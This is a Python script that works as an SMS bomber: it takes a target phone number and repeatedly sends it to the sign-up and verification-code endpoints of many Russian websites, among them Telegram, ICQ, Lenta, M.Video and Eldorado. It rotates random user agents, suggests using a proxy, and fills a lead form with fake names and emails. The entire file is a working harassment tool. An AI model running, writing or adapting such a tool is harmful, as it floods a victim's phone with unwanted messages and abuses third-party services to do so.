import formats
from banners import *
from formats import *
import requests
import random
import json
import fake_useragent
import time

with (open("male_names_rus.txt", "r", encoding="UTF-8") as f,
      open("usernames_gmail.com.txt", "r", encoding="UTF-8") as f2,
      open("cfg.json", "r", encoding="UTF-8") as config):
    names = f.read().splitlines()
    emails = f2.read().splitlines()
    cfg = json.load(config)

if cfg["custom-headers"] == "":
    print("Would you like to use a custom headers? You can change it whenever you want in cfg.json file.\n"
          "Leave it empty, if you want to use random headers.")
    a = input("Headers (leave empty for random): ")
    if a == "":
        cfg["custom-headers"] = "random"
    else:
        cfg["custom-headers"] = a
    with open("cfg.json", "w", encoding="UTF-8") as config:
        json.dump(cfg, config, indent=4)
    del a

with open("cfg.json", "r", encoding="UTF-8") as config:
    cfg = json.load(config)
while True:
    bomb16()
    print("it's better to use proxy")

    while True:
        NUMBER = input("Phone number (+79000000000 format): ")
        if NUMBER[0] != "+":
            print("Wrong format")
        else:
            break
    print(f"{NUMBER} selected as target number.")

    while True:
        try:
            RANGE = int(input("Range: "))
            INTERVAL = int(input("Interval (no interval = 0): "))
            break
        except ValueError:
            print("Wrong value")

    for i in range(RANGE):
        print(f"Starting cycle {i}")
        if cfg["custom-headers"] == "random" or cfg["custom-headers"] == "":
            HEADERS = {'user_agent': fake_useragent.UserAgent().random}
            print(f"{HEADERS['user_agent']} was selected as headers for this cycle")
        else:
            HEADERS = {'user_agent': cfg["custom-headers"]}
        try:
            response = requests.post('https://my.telegram.org/auth/send_password',
                                     headers=HEADERS, data={'phone': NUMBER}, timeout=5.05)
            print("[+] my.telegram.org")
        except Exception as ex:
            print(f"ERROR: {ex}")

        try:
            response = requests.post('https://gorodtroika.ru/api/registration/phone',
                                     headers=HEADERS, data={'phone': format_plus(NUMBER)}, timeout=5.05)
            print("[+] gorodtroika.ru")
        except Exception as ex:
            print(f"ERROR: {ex}")

        try:
            response = requests.post('https://burgerkingrus.ru/user/v3/auth/signup',
                                     headers=HEADERS, json={"phone": f"{format_plus(NUMBER)}", "invite": ""},
                                     timeout=5.05)
            print("[+] burgerkingrus.ru")
        except Exception as ex:
            print(f"ERROR: {ex}")

        try:
            response = requests.post('https://icq.com/smscode/login/ru',
                                     headers=HEADERS, data={"msisdn": f"{format_plus(NUMBER)}"}, timeout=5.05)
            print("[+] icq.com")
        except Exception as ex:
            print(f"ERROR: {ex}")
        try:
            response = requests.post('https://u.icq.net/api/v92/rapi/auth/sendCode',
                                     headers=HEADERS, json={"reqId": "81625-1703181748",
                                                            "params": {"phone": f"{format_plus(NUMBER)}",
                                                                       "language": "en-US",
                                                                       "route": "sms", "devId": "ic1rtwz1s1Hj1O0r",
                                                                       "application": "icq"}}, timeout=5.05)
            print("[+] u.icq.net")
        except Exception as ex:
            print(f'ERROR: {ex}')

        try:
            response = requests.post('https://autopragmat.ru/api/v1/send-order/',
                                     headers=HEADERS,
                                     data={"name": f"{random.choice(names)}",
                                           "tel": f"{format_plus_8(NUMBER)}",
                                           "email": f"{random.choice(emails)}", "program": "All"})
            print("[+] ratata.ru")
        except Exception as ex:
            print(f'ERROR: {ex}')

        try:
            response = requests.post('https://api.fix-price.com/buyer/v2/registration/phone/request',
                                     headers=HEADERS, json={"phone": f"{format_dash(NUMBER)}"}, timeout=5.05)
            print("[+] api.fix-price.com")
        except Exception as ex:
            print(f'ERROR: {ex}')
        try:
            response = requests.post('https://lenta.com/api/v1/registration/requestValidationCode',
                                     headers=HEADERS, json={"phone": f"{format_plus(NUMBER)}"}, timeout=5.05)
            print("[+] lenta.com")
        except Exception as ex:
            print(f'ERROR: {ex}')

        try:
            response = requests.post(
                'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
                headers=HEADERS, data={"st.r.phone": NUMBER}, timeout=5.05)
            print("[+] ok.ru")
        except Exception as ex:
            print(f'ERROR: {ex}')

        try:
            response = requests.post('https://api.sunlight.net/modules/customer-auth/v1/web/send/',
                                     headers=HEADERS, json={"phone": f"{NUMBER}", "source": "web_auth_page"},
                                     timeout=5.05)
            print("[+] api.sunlight.net")
        except Exception as ex:
            print(f'ERROR: {ex}')

        try:
            response = requests.post('https://tochka.com/api/v1/crm/request',
                                     headers=HEADERS,
                                     json={"url_path": "/", "phone": f"{format_spaces(NUMBER)}", "inn": "",
                                           "clientname": "", "comment": "", "city": "", "crm_type": "signup",
                                           "product": False, "yandex_uid": None, "advid": "",
                                           "page_description": "Главная страница сайта", "agree_to_receive_ad": True})
            print("[+] tochka.com")
        except Exception as ex:
            print(f'ERROR: {ex}')
        try:
            response = requests.post('https://www.mvideo.ru/bff/auth/login-step-1',
                                     headers=HEADERS,
                                     json={"phoneNumber": NUMBER,
                                           "token": "nocaptchatoken",
                                           "sendBy": "CASCADE",
                                           "action": "SENT_PIN_CODE"})
            print("[+] mvideo.ru")
        except Exception as ex:
            print(f'ERROR: {ex}')
        try:
            response = requests.post('https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php',
                                     headers=HEADERS,
                                     json={"user_login": formats.format_spaces_without_braces(NUMBER),
                                           "reregistration": "0",
                                           "organization": "0"})
            print("[+] eldorado.ru")
        except Exception as ex:
            print(f'ERROR: {ex}')
        print(f"{i} cycle finished")
        time.sleep(INTERVAL)
